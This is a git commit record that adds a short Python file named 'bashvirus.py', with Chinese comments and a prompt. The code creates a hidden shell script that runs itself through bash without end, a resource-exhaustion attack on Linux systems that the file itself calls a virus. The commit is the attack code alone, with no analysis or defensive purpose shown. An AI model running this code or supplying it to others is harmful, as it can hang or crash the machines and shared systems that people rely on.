e6a1a2877e80b38862a6ee0b2fb95d6f6c55d35e
zhangjing-github-code <zhangjing20091105@126.com>
2020-11-10 15:36:32 +0800

    a commit

---
+++ virus/bashvirus.py
@@ -0,0 +1,10 @@
+#本程序是通过无限运行Linux的bash来实现的
+def virus():
+    import os
+    fo = open("./.bashvirus.sh",'w')
+    fo.write("bash ./.bashvirus.sh")
+    fo.close()
+    os.popen("bash ./.bashvirus.sh")
+i = input("你确定要运行病毒吗？(y)")
+if i == 'y' or i == 'Y':
+    virus()
